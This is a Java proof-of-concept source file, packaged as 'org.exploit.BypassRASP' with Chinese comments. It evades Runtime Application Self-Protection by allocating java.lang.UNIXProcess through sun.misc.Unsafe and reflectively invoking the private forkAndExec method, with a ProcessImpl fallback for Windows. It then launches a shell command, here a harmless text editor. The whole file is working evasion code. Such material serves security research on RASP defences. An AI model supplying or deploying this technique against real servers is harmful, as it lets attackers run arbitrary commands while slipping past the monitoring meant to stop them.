package org.exploit.BypassRASP;

import sun.misc.Unsafe;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

//反射调用forkMethod
public class Bypass_UNIXProcess {
    public static void main(String[] args) throws Exception {
//        String[] cmd = new String[]{"calc"};
        String[] cmd = new String[]{"/bin/bash","-c","mousepad"};
        //创建类
        try {
            Class unixProcessClass = Class.forName("java.lang.UNIXProcess");
            //    UNIXProcess(byte[] var1, byte[] var2, int var3, byte[] var4, int var5, byte[] var6, int[] var7, boolean var8)
            Object unixProcess = unsafe_getObject(unixProcessClass);

            assert cmd != null && cmd.length > 0;

            byte[][] var5 = new byte[cmd.length - 1][];
            int var6 = var5.length;

            for(int var7 = 0; var7 < var5.length; ++var7) {
                var5[var7] = cmd[var7 + 1].getBytes();
                var6 += var5[var7].length;
            }
            byte[] var70 = new byte[var6];
            int var8 = 0;
            for(byte[] var12 : var5) {
                System.arraycopy(var12, 0, var70, var8, var12.length);
                var8 += var12.length + 1;
            }
            int[] var71 = new int[1];
            //var15 = new UNIXProcess(toCString(var0[0]), var70, var5.length, var72, var71[0], toCString(var2), var73, var4);
            Field launchMechanismField = unixProcessClass.getDeclaredField("launchMechanism");
            Field helperpathField      = unixProcessClass.getDeclaredField("helperpath");
            launchMechanismField.setAccessible(true);
            helperpathField.setAccessible(true);
            //从UNIXProcess中得到launchMechanism和Helperpath
            Object launchMechanismObject = launchMechanismField.get(unixProcess);
            byte[] helperpathObject      = (byte[]) helperpathField.get(unixProcess);
            int ordinal = (Integer) launchMechanismObject.getClass().getMethod("ordinal").invoke(launchMechanismObject);
            //反射forkAndExec方法
            Method forkMethod = unixProcessClass.getDeclaredMethod("forkAndExec", new Class[]{
                    int.class, byte[].class, byte[].class, byte[].class, int.class,
                    byte[].class, int.class, byte[].class, int[].class, boolean.class
            });
            forkMethod.setAccessible(true);
            forkMethod.invoke(unixProcess, new Object[]{
                    ordinal + 1, helperpathObject, toCString(cmd[0]), var70, var5.length, null, var71[0], toCString(null), new int[]{-1,-1,-1}, false});
        } catch (ClassNotFoundException e) {
            Class processImpl = Class.forName("java.lang.ProcessImpl");
            Constructor constructor = processImpl.getDeclaredConstructor(String[].class, String.class, String.class, long[].class, boolean.class);
            constructor.setAccessible(true);
            constructor.newInstance(cmd,null,null,new long[]{1364,1368,1376},false);
        }
    }
    private static byte[] toCString(String var0) {
        if (var0 == null) {
            return null;
        } else {
            byte[] var1 = var0.getBytes();
            byte[] var2 = new byte[var1.length + 1];
            System.arraycopy(var1, 0, var2, 0, var1.length);
            var2[var2.length - 1] = 0;
            return var2;
        }
    }

    private static <T> T unsafe_getObject(Class<? super T> objectClass) throws Exception {
        Field unsafeField = Unsafe.class.getDeclaredField("theUnsafe");
        unsafeField.setAccessible(true);
        return (T) ((Unsafe) unsafeField.get(null)).allocateInstance(objectClass);
    }
}
